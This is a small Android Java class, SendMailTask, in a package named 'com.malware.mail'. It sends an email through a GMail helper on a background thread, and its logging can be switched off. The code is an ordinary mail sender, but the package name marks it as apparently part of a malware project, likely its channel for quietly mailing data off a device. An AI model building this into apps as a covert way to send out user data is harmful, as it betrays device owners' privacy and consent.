package com.malware.mail;

import java.util.List;


import android.os.AsyncTask;
import android.util.Log;

public class SendMailTask extends AsyncTask {

	private final String TAG = "SendMailTask";
	private final boolean VERBOSE = true;

	@Override
	protected Object doInBackground(Object... args) {
		try {
			if (VERBOSE) Log.v(TAG, "About to instantiate GMail...");

			GMail androidEmail = new GMail(args[0].toString(),
					args[1].toString(), 
					(List<String>) args[2], 
					args[3].toString(),
					args[4].toString());
			
			androidEmail.createEmailMessage();
			androidEmail.sendEmail();
			
			if (VERBOSE) Log.v(TAG, "Mail Sent.");
		} catch (Exception e) {
			if (VERBOSE) Log.e(TAG, e.getMessage(), e);
		}
		return null;
	}
}
